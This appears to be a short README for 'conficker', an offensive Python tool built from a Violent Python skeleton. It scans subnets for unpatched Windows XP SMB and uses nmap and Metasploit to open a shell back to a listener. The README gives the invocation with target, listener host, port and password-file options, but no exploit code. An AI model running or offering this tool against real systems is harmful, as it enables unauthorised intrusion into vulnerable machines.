conficker
=========

scan and exploit SMB on unpatched Win XP boxes automatically to spawn shell (scans subnets with CIDR notation)

USAGE: <br/>
python conficker.py -H &#60; RHOSTS &#62; -l &#60; LHOST &#62; [-p &#60; LPORT &#62; -F &#60; Password File &#62;]

LPORT and Password File parameters are optional. LPORT defaults to 1337.

CREDITS: <br/>
Violent Python - for providing the skeleton even though they teach bad coding practice, and debugging is necessary

REQUIREMENTS: <br/>
-python2 nmap module <br/>
-nmap <br/>
-metasploit <br/>